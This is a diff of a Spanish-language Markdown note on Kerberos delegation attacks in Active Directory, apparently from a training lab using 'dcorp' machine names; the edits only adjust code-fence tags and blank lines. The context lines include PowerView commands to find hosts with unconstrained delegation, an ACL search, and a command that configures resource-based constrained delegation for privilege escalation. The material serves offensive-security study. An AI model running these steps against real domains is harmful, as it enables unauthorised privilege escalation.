@@ -11,7 +11,7 @@ Kerberos es el protocolo de auntentiación que utiliza Active Directory por defe
 
 ![Imagen Kerberos](https://www.tarlogic.com/wp-content/uploads/2019/03/kerberosI-1200x900.png){width='75px'}
 
-```console powershell
+```console
 
 # Discover domain computers which have unconstrained delegation enabled using PowerView:
 Get-DomainComputer -UnConstrained    #(Cuando ejecutamos este comando siempre nos devolverá como resultado también al DOMAIN CONTROLLER (Ej: DCORP-DC$) pero tenemos que ignorar ese OUTPUT)
@@ -49,11 +49,13 @@ Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 # Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
 $comps = 'dcorp-student1$','dcorp-student2$'
 Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+
 ```
 
 # UNCONSTRAINED DELEGATION
 
 ```console powershell
+
 ################################################################################
 ############## UNCONSTRAINED DELEGATION - Privilege Escalation #################
 ################################################################################
